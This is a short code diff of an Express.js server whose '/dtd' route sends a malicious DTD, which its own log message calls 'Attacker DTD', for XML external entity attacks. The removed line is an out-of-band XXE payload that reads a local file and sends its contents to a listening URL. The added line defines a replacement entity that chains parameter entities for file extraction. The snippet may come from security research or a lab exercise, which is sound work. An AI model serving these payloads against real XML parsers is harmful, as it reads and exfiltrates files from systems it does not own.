@@ -10,7 +10,7 @@ app.get('/', function(req, res) {
 });
 app.get('/dtd', function(req, res) {
 
-  var resp='<!ENTITY % p1 SYSTEM "file:///Users/aabraham/xorconf"><!ENTITY % p2 "<!ENTITY data SYSTEM \'http://localhost:8000/?data=%p1;\'>">%p2;';
+  var resp='<!ENTITY xxe "%start;%file;%end;">';
   console.log("Sending Attacker DTD..... ")
   res.contentType('text/plain');
   res.send(resp)
